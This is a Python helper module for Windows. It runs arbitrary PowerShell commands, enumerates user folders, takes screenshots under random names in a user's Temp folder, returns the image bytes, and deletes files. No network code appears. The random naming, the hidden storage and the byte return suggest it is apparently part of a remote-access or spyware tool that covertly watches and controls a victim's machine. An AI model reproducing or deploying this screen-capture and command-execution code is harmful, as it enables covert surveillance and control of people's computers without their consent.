import pyscreeze
import os
import subprocess
import random


def random_name() -> str:
    abc = "qwertyuiopasdfghjklzxcvbnm1234567890"
    return "".join([abc[random.randint(0, len(abc) - 1)] for _ in range(0, len(abc) - 20)])


def exec_command(command: str) -> bytes:
    result = subprocess.run(["powershell.exe", command], shell=True, capture_output=True)
    if result.stderr.decode('cp866') == '':
        return result.stdout
    return result.stderr


def know_user() -> list[str]:
    users = []
    pos1 = 315
    output = exec_command("dir C:\\Users")
    output = output.decode('cp866')
    while len(output.strip()[pos1:].strip()) > 0:
        users.append(output.strip()[pos1:pos1-100+((pos1+120)-pos1)].strip())
        pos1 += 120
    return [i for i in users if i != 'Public']


def save_screenshot() -> dict[str, str | bytes]:
    for user_folder in know_user():
        path = f"C:\\Users\\{user_folder}\\Appdata\\Local\\Temp"
        if os.path.exists(path):
            file_name = random_name() + '.png'
            scr = pyscreeze.screenshot()
            scr.save(f"{path}\\{file_name}")
            print("successfully saved screenshot as " + file_name)
            return {"path": f"{path}\\{file_name}", "bytes": byte_represent(f"{path}\\{file_name}")}
        print("continuing ...")
        continue


def byte_represent(path: str) -> bytes:
    if os.path.isfile(path):
        with open(path, 'rb') as img_file:
            img_data = img_file.read()
            return img_data


def delete_file(path: str) -> None:
    if os.path.exists(path):
        os.unlink(path)


def handle_dir(path: str) -> None:
    if os.path.exists(path):
        os.chdir(path)
    return


def make_temp_path() -> str:
    user_list = know_user()
    for user in user_list:
        path = f"C:\\Users\\{user}\\Appdata\\Local\\Temp"
        if os.path.exists(path):
            return path
        else:
            continue


